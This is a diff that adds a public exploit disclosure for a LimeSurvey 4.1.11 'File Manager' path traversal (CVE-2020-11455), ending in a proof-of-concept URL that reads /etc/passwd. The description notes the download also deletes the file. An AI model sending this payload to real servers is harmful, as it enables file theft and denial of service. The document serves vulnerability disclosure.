@@ -1,0 +1,18 @@
+# Exploit Title: LimeSurvey 4.1.11 - 'File Manager' Path Traversal
+# Date: 2020-04-02
+# Exploit Author: Matthew Aberegg, Michael Burkey
+# Vendor Homepage: https://www.limesurvey.org
+# Version: LimeSurvey 4.1.11+200316
+# Tested on: Ubuntu 18.04.4
+# CVE : CVE-2020-11455
+
+# Vulnerability Details
+# Description : A path traversal vulnerability exists within the "File Manager" functionality of LimeSurvey
+# that allows an attacker to download arbitrary files.  The file manager functionality will also 
+# delete the file after it is downloaded (if the web service account has permissions to do so), 
+# allowing an attacker to cause a denial of service by specifying a critical LimeSurvey configuration file.
+Vulnerable Parameter : "path"
+
+
+# POC
+https://TARGET/limesurvey/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd
